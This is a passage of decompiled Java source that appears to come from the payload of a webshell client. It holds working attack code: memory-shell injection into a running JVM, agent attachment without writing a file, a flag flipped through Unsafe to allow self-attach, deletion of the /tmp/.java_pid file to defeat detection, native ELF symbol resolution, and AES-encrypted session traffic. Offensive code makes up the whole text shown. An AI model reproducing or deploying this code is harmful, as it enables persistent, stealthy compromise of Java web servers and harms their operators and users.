5, 0, -75, 0, 0, 0, 18, 0, 7, -4, 0, 5, 1, -3, 0, 8, 1, 1, 21, 2, 2, -7, 0, 20, 2, 0, 1, 0, -59, 0, 0, 0, 2, 0, -58};
      Class injector = (new MemShell(this.getClass().getClassLoader())).parse(inject);
      injector.getField("pointerLength").set((Object)null, 8);
      injector.getField("classBody").set((Object)null, classBody);
      injector.getField("className").set((Object)null, className);
      if (System.getProperty("os.arch").indexOf("x86") >= 0) {
         injector.getField("pointerLength").set((Object)null, 4);
      }

      Method work = injector.getDeclaredMethod("work");

      try {
         work.invoke((Object)null, (Object[])null);
      } catch (InvocationTargetException var8) {
         throw var8.getTargetException();
      }
   }

   private void doInjectAgentNoFile(String className, byte[] classBody, boolean antiAgent) throws Throwable {
      String os = System.getProperty("os.name").toLowerCase();
      if (os.indexOf("windows") >= 0) {
         this.agentForWindow(className, classBody, antiAgent);
      } else if (os.indexOf("mac") < 0) {
         this.agentForLinux(className, classBody, antiAgent);
      }

   }

   private void antiAgentLinux() {
      String osInfo = System.getProperty("os.name").toLowerCase();
      if (osInfo.indexOf("linux") >= 0) {
         String fileName = "/tmp/.java_pid" + getCurrentPID();
         (new File(fileName)).delete();
      }

   }

   private void doInjectFilter() {
   }

   private static String getCurrentPID() {
      String name = ManagementFactory.getRuntimeMXBean().getName();
      String pid = name.split("@")[0];
      return pid;
   }

   private static byte[] base64decode(String base64Text) throws Exception {
      String version = System.getProperty("java.version");
      byte[] result;
      Class Base64;
      Object Decoder;
      if (version.compareTo("1.9") >= 0) {
         Base64 = Class.forName("java.util.Base64");
         Decoder = Base64.getMethod("getDecoder", (Class[])null).invoke(Base64, (Object[])null);
         result = (byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, base64Text);
      } else {
         Base64 = Class.forName("sun.misc.BASE64Decoder");
         Decoder = Base64.newInstance();
         result = (byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, base64Text);
      }

      return result;
   }

   private static String base64encode(byte[] content) throws Exception {
      String result = "";
      String version = System.getProperty("java.version");
      Class Base64;
      Object Encoder;
      if (version.compareTo("1.9") >= 0) {
         Base64 = Class.forName("java.util.Base64");
         Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
         result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, content);
      } else {
         Base64 = Class.forName("sun.misc.BASE64Encoder");
         Encoder = Base64.newInstance();
         result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, content);
         result = result.replace("\n", "").replace("\r", "");
      }

      return result;
   }

   private static String base64encode(String content) throws Exception {
      String result = "";
      String version = System.getProperty("java.version");
      Class Base64;
      Object Encoder;
      if (version.compareTo("1.9") >= 0) {
         Base64 = Class.forName("java.util.Base64");
         Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
         result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, content.getBytes("UTF-8"));
      } else {
         Base64 = Class.forName("sun.misc.BASE64Encoder");
         Encoder = Base64.newInstance();
         result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, content.getBytes("UTF-8"));
         result = result.replace("\n", "").replace("\r", "");
      }

      return result;
   }

   public static byte[] getFileData(String filePath) throws Exception {
      byte[] fileContent = new byte[0];
      FileInputStream fis = new FileInputStream(new File(filePath));
      byte[] buffer = new byte[10240000];

      int length;
      for(length = 0; (length = fis.read(buffer)) > 0; fileContent = mergeBytes(fileContent, Arrays.copyOfRange(buffer, 0, length))) {
      }

      fis.close();
      return fileContent;
   }

   public static byte[] mergeBytes(byte[] a, byte[] b) throws Exception {
      ByteArrayOutputStream output = new ByteArrayOutputStream();
      output.write(a);
      output.write(b);
      return output.toByteArray();
   }

   private void fillContext(Object obj) throws Exception {
      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
         this.Request = obj.getClass().getMethod("getRequest").invoke(obj);
         this.Response = obj.getClass().getMethod("getResponse").invoke(obj);
         this.Session = obj.getClass().getMethod("getSession").invoke(obj);
      } else {
         Map objMap = (Map)obj;
         this.Session = objMap.get("session");
         this.Response = objMap.get("response");
         this.Request = objMap.get("request");
      }

      this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
   }

   private String buildJson(Map entity, boolean encode) throws Exception {
      StringBuilder sb = new StringBuilder();
      String version = System.getProperty("java.version");
      sb.append("{");
      Iterator var5 = entity.keySet().iterator();

      while(var5.hasNext()) {
         String key = (String)var5.next();
         sb.append("\"" + key + "\":\"");
         String value = ((String)entity.get(key)).toString();
         if (encode) {
            value = base64encode(value);
         }

         sb.append(value);
         sb.append("\",");
      }

      if (sb.toString().endsWith(",")) {
         sb.setLength(sb.length() - 1);
      }

      sb.append("}");
      return sb.toString();
   }

   private byte[] Encrypt(byte[] bs) throws Exception {
      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
      byte[] raw = key.getBytes("utf-8");
      SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
      Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
      cipher.init(1, skeySpec);
      byte[] encrypted = cipher.doFinal(bs);
      return encrypted;
   }

   private Object sessionGetAttribute(Object session, String key) {
      Object result = null;

      try {
         result = session.getClass().getMethod("getAttribute", String.class).invoke(session, key);
      } catch (Exception var5) {
      }

      return result;
   }

   private void sessionSetAttribute(Object session, String key, Object value) {
      try {
         session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
      } catch (Exception var5) {
      }

   }

   private void enableAttachSelf() {
      try {
         Unsafe unsafe = null;

         try {
            Field field = Unsafe.class.getDeclaredField("theUnsafe");
            field.setAccessible(true);
            unsafe = (Unsafe)field.get((Object)null);
         } catch (Exception var6) {
            throw new AssertionError(var6);
         }

         Class cls = Class.forName("sun.tools.attach.HotSpotVirtualMachine");
         Field field = cls.getDeclaredField("ALLOW_ATTACH_SELF");
         long fieldAddress = unsafe.staticFieldOffset(field);
         unsafe.putBoolean(cls, fieldAddress, true);
      } catch (Throwable var7) {
      }

   }

   private byte[] getMagic() throws Exception {
      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
      int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
      Random random = new Random();
      byte[] buf = new byte[magicNum];

      for(int i = 0; i < buf.length; ++i) {
         buf[i] = (byte)random.nextInt(256);
      }

      return buf;
   }

   private static int ELF_ST_TYPE(int x) {
      return x & 15;
   }

   static long find_symbol(String elfpath, String sym, long libbase) throws IOException {
      long func_ptr = 0L;
      RandomAccessFile fin = new RandomAccessFile(elfpath, "r");
      byte[] e_ident = new byte[16];
      fin.read(e_ident);
      short e_type = Short.reverseBytes(fin.readShort());
      short e_machine = Short.reverseBytes(fin.readShort());
      int e_version = Integer.reverseBytes(fin.readInt());
      long e_entry = Long.reverseBytes(fin.readLong());
      long e_phoff = Long.reverseBytes(fin.readLong());
      long e_shoff = Long.reverseBytes(fin.readLong());
      int e_flags = Integer.reverseBytes(fin.readInt());
      short e_ehsize = Short.reverseBytes(fin.readShort());
      short e_phentsize = Short.reverseBytes(fin.readShort());
      short e_phnum = Short.reverseBytes(fin.readShort());
      short e_shentsize = Short.reverseBytes(fin.readShort());
      short e_shnum = Short.reverseBytes(fin.readShort());
      short e_shstrndx = Short.reverseBytes(fin.readShort());
      int sh_name = 0;
      int sh_type = 0;
      long sh_flags = 0L;
      long sh_addr = 0L;
      long sh_offset = 0L;
      long sh_size = 0L;
      int sh_link = 0;
      int sh_info = 0;
      long sh_addralign = 0L;
      long sh_entsize = 0L;

      for(int i = 0; i < e_shnum; ++i) {
         fin.seek(e_shoff + (long)(i * 64));
         sh_name = Integer.reverseBytes(fin.readInt());
         sh_type = Integer.reverseBytes(fin.readInt());
         sh_flags = Long.reverseBytes(fin.readLong());
         sh_addr = Long.reverseBytes(fin.readLong());
         sh_offset = Long.reverseBytes(fin.readLong());
         sh_size = Long.reverseBytes(fin.readLong());
         sh_link = Integer.reverseBytes(fin.readInt());
         sh_info = Integer.reverseBytes(fin.readInt());
         sh_addralign = Long.reverseBytes(fin.readLong());
         sh_entsize = Long.reverseBytes(fin.readLong());
         if (sh_type == 11) {
            break;
         }
      }

      long symtab_shdr_sh_size = sh_size;
      long symtab_shdr_sh_entsize = sh_entsize;
      long symtab_shdr_sh_offset = sh_offset;
      fin.seek(e_shoff + (long)(sh_link * e_shentsize));
      sh_name = Integer.reverseBytes(fin.readInt());
      sh_type = Integer.reverseBytes(fin.readInt());
      sh_flags = Long.reverseBytes(fin.readLong());
      sh_addr = Long.reverseBytes(fin.readLong());
      sh_offset = Long.reverseBytes(fin.readLong());
      sh_size = Long.reverseBytes(fin.readLong());
      sh_link = Integer.reverseBytes(fin.readInt());
      sh_info = Integer.reverseBytes(fin.readInt());
      sh_addralign = Long.reverseBytes(fin.readLong());
      sh_entsize = Long.reverseBytes(fin.readLong());
      long symstr_shdr_sh_offset = sh_offset;
      long cnt = symtab_shdr_sh_entsize > 0L ? symtab_shdr_sh_size / symtab_shdr_sh_entsize : 0L;

      for(long i = 0L; i < cnt; ++i) {
         fin.seek(symtab_shdr_sh_offset + symtab_shdr_sh_entsize * i);
         int st_name = Integer.reverseBytes(fin.readInt());
         byte st_info = fin.readByte();
         byte st_other = fin.readByte();
         short st_shndx = Short.reverseBytes(fin.readShort());
         long st_value = Long.reverseBytes(fin.readLong());
         long st_size = Long.reverseBytes(fin.readLong());
         if (st_value != 0L && st_name != 0 && (ELF_ST_TYPE(st_info) == 2 || ELF_ST_TYPE(st_info) == 10)) {
            fin.seek(symstr_shdr_sh_offset + (long)st_name);
            String name = "";

            byte ch;
            for(ch = 0; (ch = fin.readByte()) != 0; name = name + (char)ch) {
            }

            if (sym.equals(name)) {
               func_ptr = libbase + st_value;
               break;
            }
         }
      }

      fin.close();
      return func_ptr;
   }

   private Boolean detect(String className) {
      try {
         ClassLoader.getSystemClassLoader().loadClass(className);
         return Boolean.TRUE;
      } catch (ClassNotFoundException var3) {
         return this.getClass().getResource(className) != null ? Boolean.TRUE : Boolean.FALSE;
      }
   }
}
